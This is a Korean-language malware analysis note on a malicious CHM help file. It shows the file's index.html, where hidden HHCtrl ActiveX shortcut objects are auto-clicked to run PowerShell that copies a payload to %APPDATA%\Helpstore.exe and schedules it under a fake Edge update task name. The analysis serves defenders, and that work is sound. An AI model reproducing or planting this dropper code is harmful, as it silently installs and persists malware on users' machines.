## ActiveX Shortcut

chm은 내부에 index.html이라는 파일을 가지고 있음. 이는 압축 해제를 통해 간단히 확인할 수 있음.

![](images/chm/IMG-chm-20240911185753215.png)

chm 파일을 실행하게 되면 index.html이 실행되게 되고, 내부에 악성 스크립트가 실행되게 되기 때문에 내부를 확인할 필요가 있음.

![](images/chm/IMG-chm-20240911185802556.png)

공격자는 ActiveX 기능을 악용하여 사용자의 컴퓨터에서 악성 코드를 실행함.

[About ActiveX Shortcut Command](https://documentation.help/HTML-Help-ActiveX/ocx_shortcut.htm)

|**Property**|**Description**|
|---|---|
|[Button](https://documentation.help/HTML-Help-ActiveX/ocx_pbutton.htm)|Specifies the button style. Optional.|
|[Command](https://documentation.help/HTML-Help-ActiveX/ocx_pcommand.htm)|Calls the **Shortcut** command.|
|[Font](https://documentation.help/HTML-Help-ActiveX/ocx_pfont.htm)|Specifies the font attributes. Optional.|
|[Item1](https://documentation.help/HTML-Help-ActiveX/ocx_pitem.htm)|Specifies the file path to the executable file (.exe) for the program, and any parameters to be sent to the program. These values are delimited by a comma.<br><br>HTML Help does not support `%WINDIR%` or other system variables in the file path.|
|[Item2](https://documentation.help/HTML-Help-ActiveX/ocx_pitem.htm)|Specifies the message ID of a standard Windows message, a _wPARAM_ value, and a _lPARAM_ value. These values are delimited by a comma.|
|[Text](https://documentation.help/HTML-Help-ActiveX/ocx_ptext.htm)|Specifies the link text. Optional.|

악성 스크립트는 Shortcut Command를 사용해 지정된 작업의 Shortcut을 생성함. 여기서 중요한 속성은 Item1으로 프로그램의 실행 파일에 대한 경로와 매개변수를 지정할 수 있음.

```html
<OBJECT id =qjswc classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1 style="display:none;">
	<PARAM name = "Command" value = "ShortCut">
	<PARAM name = "Button" value = "Bitmap::shortcut">
	<PARAM name = "Item1" value = ',cmd.exe,/c start /min /b powershell.exe -command "If (Test-Path \"$env:TEMP\") { Get-ChildItem \"$env:TEMP\" -File | Where-Object { $_.Length -eq 1596928 } | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"$env:APPDATA\\Helpstore.exe\" -Force } }"'>
</OBJECT>

<OBJECT id=oheam classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=100 height=100 style="display:none;">
	<PARAM name="Command" value="ShortCut">
	<PARAM name="Button" value="Bitmap::shortcut">
	<PARAM name="Item1" value=',cmd.exe,/c start /min /b powershell.exe -WindowStyle Hidden -Command "schtasks /create /tn \"MicrosoftEdgeUpdateTask\" /tr \"%APPDATA%\Helpstore.exe\" /sc ONCE /st (Get-Date).AddMinutes(1).ToString(\"HH:mm\")"'>
</OBJECT>
```

위의 악성 스크립트는 `HHCtrl Object`의 `clsid = {ADB880A6-D8FF-11CF-9377-00AA003B7A11}`를 사용해 지정된 작업의 바로가기들을 생성함.

```html
<bgsound src="Helpstore.exe">
```

악성 파일로 추정되는 Helpstore.exe는 bgsound로 저장되어 있음.

```html
<script>
	qjswc.Click();
	oheam.Click();
</script>
```

위 스크립트를 통해 생성한 HHCtrl Object에 Click 이벤트가 발생 시, 즉 chm 파일을 실행하게 되면 지정한 명령이 실행되게 끔 코딩되어 있음.